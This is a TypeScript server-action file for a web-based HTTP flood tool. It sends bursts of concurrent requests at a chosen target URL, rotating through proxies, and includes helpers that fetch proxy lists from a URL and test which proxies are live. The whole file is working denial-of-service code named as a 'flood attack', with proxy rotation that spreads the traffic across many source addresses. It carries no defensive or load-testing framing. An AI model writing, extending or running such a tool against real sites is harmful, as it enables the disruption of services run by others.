
"use server";

import { HttpsProxyAgent } from "https-proxy-agent";

export interface FloodStats {
  totalSent: number;
  successful: number;
  failed: number;
  error?: string;
}

const METHODS_WITHOUT_BODY = ["GET", "HEAD", "DELETE", "OPTIONS"];
const PROXY_TEST_URL = "https://www.google.com/generate_204"; // Lightweight URL for testing
const PROXY_TEST_TIMEOUT_MS = 7000; // 7 seconds
const CONCURRENT_PROXY_CHECKS = 10;


export async function startFloodAttack(
  targetUrl: string,
  method: string,
  headersString?: string,
  body?: string,
  concurrency?: number,
  rate?: number,
  durationInSeconds?: number,
  proxiesString?: string
): Promise<FloodStats> {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(targetUrl);
  } catch (e) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Invalid target URL. Please include scheme (e.g., http:// or https://)." };
  }

  if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
     return { totalSent: 0, successful: 0, failed: 0, error: "Target URL must use http or https protocol." };
  }
  
  const safeConcurrency = Math.min(Math.max(1, concurrency ?? 50), 500); 
  const safeRate = Math.min(Math.max(1, rate ?? 50), 500);
  const safeDuration = Math.min(Math.max(5, durationInSeconds ?? 10), 60);

  if (safeConcurrency <= 0 || safeRate <= 0 || safeDuration <=0) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Concurrency, rate, and duration must be positive values." };
  }

  const parsedHeaders: HeadersInit = {};
  if (headersString) {
    headersString.split('\n').forEach(line => {
      const parts = line.split(':');
      if (parts.length >= 2) {
        const key = parts[0].trim();
        const value = parts.slice(1).join(':').trim();
        if (key && value) {
          parsedHeaders[key] = value;
        }
      }
    });
  }

  const baseFetchOptions: RequestInit = {
    method: method.toUpperCase(),
    headers: parsedHeaders,
    signal: AbortSignal.timeout(5000) 
  };

  if (body && !METHODS_WITHOUT_BODY.includes(method.toUpperCase())) {
    baseFetchOptions.body = body;
    
    if (!parsedHeaders['Content-Type'] && !parsedHeaders['content-type']) {
        try {
            JSON.parse(body);
            parsedHeaders['Content-Type'] = 'application/json';
        } catch (e) {
            parsedHeaders['Content-Type'] = 'text/plain';
        }
        baseFetchOptions.headers = parsedHeaders; 
    }
  }

  let parsedProxies: string[] = [];
  if (proxiesString) {
    parsedProxies = proxiesString
      .split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0);

    if (parsedProxies.length === 0 && proxiesString.trim().length > 0) {
        return { totalSent: 0, successful: 0, failed: 0, error: "No valid proxy strings could be parsed. Check format (e.g., host:port or IP:PORT)." };
    }
  }


  let totalSent = 0;
  let successful = 0;
  let failed = 0;
  const startTime = Date.now();
  const endTime = startTime + safeDuration * 1000;

  console.log(`Starting flood: ${method} ${targetUrl}, Concurrency: ${safeConcurrency}, Rate: ${safeRate} RPS, Duration: ${safeDuration}s, Proxies: ${parsedProxies.length}`);

  try {
    while (Date.now() < endTime) {
      const batchStartTime = Date.now();
      const requestsInBatch: Promise<void>[] = [];
      
      const numRequestsThisBurst = safeConcurrency;

      for (let i = 0; i < numRequestsThisBurst; i++) {
        if (Date.now() >= endTime) break;

        let currentFetchOptions = { ...baseFetchOptions };
        if (parsedProxies.length > 0) {
          const proxyConfig = parsedProxies[totalSent % parsedProxies.length];
          try {
            const agent = new HttpsProxyAgent(proxyConfig); 
            currentFetchOptions.agent = agent as any; 
          } catch (e) {
            console.error(`Error creating proxy agent for ${proxyConfig}:`, e);
            failed++;
            totalSent++; 
            continue; 
          }
        }

        requestsInBatch.push(
          fetch(targetUrl, currentFetchOptions) 
            .then(response => {
              if (response.ok || (response.status >= 200 && response.status < 400)) {
                successful++;
              } else {
                failed++;
              }
            })
            .catch(() => {
              failed++;
            })
            .finally(() => {
              totalSent++;
            })
        );
      }
      
      await Promise.allSettled(requestsInBatch);

      if (Date.now() >= endTime) break;

      const batchDurationMs = Date.now() - batchStartTime;
      const targetBatchIntervalMs = (numRequestsThisBurst / safeRate) * 1000;
      const delayMs = Math.max(0, targetBatchIntervalMs - batchDurationMs);
      
      if (delayMs > 0) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }
    }
  } catch (e: any) {
    console.error("Flood attack error:", e);
    return { totalSent, successful, failed, error: e.message || "An unexpected error occurred during the flood." };
  } finally {
    console.log(`Flood ended: Total Sent: ${totalSent}, Successful: ${successful}, Failed: ${failed}`);
  }

  return { totalSent, successful, failed };
}

export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: string; error?: string }> {
  if (!apiUrl.trim()) {
    return { error: "API URL cannot be empty." };
  }
  try {
    new URL(apiUrl);
  } catch (e) {
    return { error: "Invalid API URL format. Please include the scheme (e.g., http:// or https://)." };
  }

  try {
    const response = await fetch(apiUrl, { 
      signal: AbortSignal.timeout(10000), 
      headers: { 'Accept': 'text/plain' } 
    }); 
    if (!response.ok) {
      return { error: `API request failed with status ${response.status}: ${response.statusText}` };
    }
    const text = await response.text();
    if (!text.trim()) {
      return { error: "API returned an empty proxy list." };
    }
    
    const lines = text.trim().split('\n');
    const strippedLines = lines.map(line => line.trim().replace(/^(http(s)?:\/\/)/i, ''));
    
    // Basic validation for stripped lines
    if (strippedLines.length === 0 || !strippedLines.some(line => /^\S+:\d+$/.test(line.trim()) || /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$/.test(line.trim()) )) {
      // console.warn("Fetched proxy list, after stripping schemes, does not seem to contain valid IP:Port or Host:Port formats.", strippedLines.slice(0,5));
    }
    return { proxies: strippedLines.join('\n') };
  } catch (e: any) {
    console.error("Error fetching proxies from API:", e);
    if (e.name === 'TimeoutError') {
        return { error: "API request timed out." };
    }
    return { error: e.message || "Failed to fetch proxies. Check browser console for more details." };
  }
}


export async function checkProxies(proxiesString: string): Promise<{
  liveProxiesString: string;
  liveCount: number;
  deadCount: number;
  totalChecked: number;
  error?: string;
}> {
  if (!proxiesString || proxiesString.trim() === "") {
    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0 };
  }

  const proxyEntries = proxiesString.split('\n')
    .map(line => line.trim())
    .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://")); // Ensure no schemes here

  if (proxyEntries.length === 0) {
    // This could happen if all input proxies had schemes and were filtered out,
    // or if the input was empty after trimming schemes.
    // Consider if a more specific message is needed if initialProxiesString was not empty.
    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "No proxies in the correct host:port format found to check." };
  }

  const liveProxiesArray: string[] = [];
  let deadCount = 0;

  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => { // proxyUrl is host:port
    try {
      const agent = new HttpsProxyAgent(proxyUrl);
      const response = await fetch(PROXY_TEST_URL, {
        agent: agent as any,
        signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT_MS),
        redirect: 'manual', 
      });
      return response.status === 204 || response.status === 200;
    } catch (error) {
      // console.warn(`Proxy ${proxyUrl} failed check:`, error.message);
      return false;
    }
  };

  for (let i = 0; i < proxyEntries.length; i += CONCURRENT_PROXY_CHECKS) {
    const batch = proxyEntries.slice(i, i + CONCURRENT_PROXY_CHECKS);
    const results = await Promise.allSettled(
      batch.map(proxy => checkSingleProxy(proxy).then(isLive => ({ proxy, isLive })))
    );

    results.forEach(result => {
      if (result.status === 'fulfilled') {
        if (result.value.isLive) {
          liveProxiesArray.push(result.value.proxy);
        } else {
          deadCount++;
        }
      } else {
        deadCount++;
      }
    });
  }

  return {
    liveProxiesString: liveProxiesArray.join('\n'),
    liveCount: liveProxiesArray.length,
    deadCount: deadCount,
    totalChecked: proxyEntries.length,
  };
}

